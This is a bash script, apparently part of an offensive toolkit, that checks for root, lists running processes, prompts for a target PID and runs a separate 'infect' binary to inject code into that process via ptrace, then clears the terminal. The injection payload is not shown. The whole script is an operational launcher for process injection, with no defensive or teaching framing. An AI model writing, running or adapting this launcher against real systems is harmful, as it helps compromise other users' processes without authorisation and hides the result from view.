#!/bin/bash

if [[ $(id -u) -ne 0 ]]; then
    echo "[ERROR] You must run this script as root" >&2
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
INFECT_BIN="$SCRIPT_DIR/../procinject/infect"
PID_BIN="$SCRIPT_DIR/../procinject/pid"

if [ ! -f "$INFECT_BIN" ]; then
    echo "[ERROR] infect binary not found at $INFECT_BIN" >&2
    exit 1
fi

chmod +x "$INFECT_BIN" "$PID_BIN" 2>/dev/null

echo " [*] Process Injection (ptrace) [*] "
echo ""
echo "This will inject into a running process using ptrace."
echo ""
echo "List running processes? (Y/n): "
read list_procs

if [[ "$list_procs" == "Y" || "$list_procs" == "y" || "$list_procs" == "" ]]; then
    ps aux --sort=-%mem | head -20
    echo ""
fi

read -p "Enter the target PID to inject into: " target_pid

if [ -z "$target_pid" ]; then
    echo "[ERROR] No PID specified." >&2
    exit 1
fi

if [ ! -d "/proc/$target_pid" ]; then
    echo "[ERROR] Process $target_pid does not exist." >&2
    exit 1
fi

echo "[*] Injecting into process $target_pid ..."
"$INFECT_BIN" "$target_pid"

clear

echo "[*] Process injection executed against PID $target_pid [*]"

sleep 1

clear
